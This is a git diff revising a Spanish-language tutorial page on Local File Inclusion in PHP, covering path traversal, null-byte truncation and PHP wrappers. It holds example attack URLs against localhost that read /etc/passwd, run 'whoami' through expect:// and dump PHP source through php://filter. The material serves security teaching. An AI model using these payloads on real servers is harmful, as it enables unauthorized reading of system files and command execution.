@@ -3,7 +3,7 @@ title: Local File Inclusion (LFI)
 published: true
 ---
 
-La vulnerabilidad 'Local File Inclusion' permite a un atacante leer un archivo del servidor vulnerable, se produce debido a un error de programación de la página.
+La vulnerabilidad 'Local File Inclusion', o en sus siglas 'LFI', permite a un atacante leer archivos del servidor vulnerable. Esta afección se produce debido a malas prácticas durante la programación de una página web. 
 
 Dependiendo de la importancia, esta vulnerabilidad puede llevar al atacante a:
 	
@@ -11,7 +11,7 @@ Dependiendo de la importancia, esta vulnerabilidad puede llevar al atacante a:
 * XSS (Cross-Site Scripting)
 * DoS (Denial Of Service)
 
-Un ejemplo muy básico sería el siguiente script de php:
+Un ejemplo muy básico sería el siguiente script de PHP:
 
 ```php
 <?php
@@ -20,13 +20,17 @@ Un ejemplo muy básico sería el siguiente script de php:
 ?>
 ```
 
+Donde podemos leer cualquier archivo del sistema, en este caso el '/etc/passwd'
+
 ```
 https://localhost/lfi.php?filename=/etc/passwd
 ```
 
-Esto no es solo una vulnerabilidad de php, también está presente en otros lenguajes como jsp, asp entre otros.
+Es importante aclarar que esta no es solo una vulnerabilidad de PHP, también está presente en otros lenguajes como lo es JSP o ASP.
 
 ### [](#header-3)Directory Path Traversal
+
+Es posible que en el código se nos limite a acceder a archivos que se ubican únicamente en la ruta establecida, en este caso '/var/www/html/'.
 
 ```php
 <?php
@@ -35,13 +39,15 @@ Esto no es solo una vulnerabilidad de php, también está presente en otros leng
 ?>
 ```
 
-Solo podemos listar el contenido de la ruta especificada; sin embargo, si añadimos '../', podremos listar contenido más allá de '/var/www/html/'.
+Sin embargo, podemos "escaparnos" de la ruta establecida si añadimos '../', pudiendo así listar contenido más allá de '/var/www/html/'.
 
 ```
 https://localhost/lfi.php?filename=../../../etc/passwd
 ```
 
 ### [](#header-3)Null Byte
+
+De igual manera, es posible que en el código se nos limite a acceder a archivos con únicamente de la extensión establecida, en este caso 'PHP'.
 
 ```php
 <?php
@@ -50,7 +56,7 @@ https://localhost/lfi.php?filename=../../../etc/passwd
 ?>
 ```
 
-El '.php' se añade al nombre del archivo; sin embargo, si añadimos el nullbyte al final de nuestra cadena de ataque, el '.php' no será tenido en cuenta. 
+De modo que cuando intentemos leer el archivo '/etc/passwd', o cualquier otro archivo, lo que estariamos leyendo en realidad sería el archivo '/etc/passwd.php', el cual no existe. Sin embargo, si añadimos el nullbyte (%00) al final de nuestra cadena de ataque, el '.php' no será tenido en cuenta. 
 
 ```
 https://localhost/lfi.php?filename=/etc/passwd%00
@@ -58,9 +64,11 @@ https://localhost/lfi.php?filename=/etc/passwd%00
 
 ### [](#header-3)Wrappers
 
+PHP cuenta con una serie de "wrappers", los cuales a menudo pueden ser abusados, por mencionar algunos tenemos:
+
 #### [](#header-4)expect://
 
-Ejecutar comandos.
+Nos permite una ejecución remota de comandos (RCE).
 
 ```
 https://localhost/lfi.php?filename=expect://whoami
@@ -68,7 +76,7 @@ https://localhost/lfi.php?filename=expect://whoami
 
 #### [](#header-4)filter://
 
-Leer php.
+Nos permite codificar archivos del sistema a través de diferentes métodos como podría ser Base64 o ROT13. Es bastante útil si necesitamos leer un archivo en PHP, ya que recordemos, este es un lenguaje interpretado, por lo que si intentamos leer un archivo PHP, no veríamos nada.
 
 ```
 https://localhost/lfi.php?filename=php://filter/convert.base64-encode/resource=test.php
